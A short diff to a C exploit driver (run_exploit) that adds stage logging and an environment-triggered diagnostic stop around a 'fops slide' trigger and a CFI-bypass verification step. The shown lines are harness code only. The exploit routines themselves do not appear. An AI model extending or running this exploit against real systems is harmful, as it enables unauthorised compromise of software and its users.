@@ -245,8 +245,21 @@ int run_exploit(int argc, char **argv) {
   if (!page_base) {
     return 1;
   }
+  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
+  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
+    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
+    if (pipe_prepare_child > 0) {
+      SYSCHK(kill(pipe_prepare_child, SIGKILL));
+      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
+      pipe_prepare_child = -1;
+    }
+    return 2;
+  }
+  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
+    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
+            attempt, triggered);
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
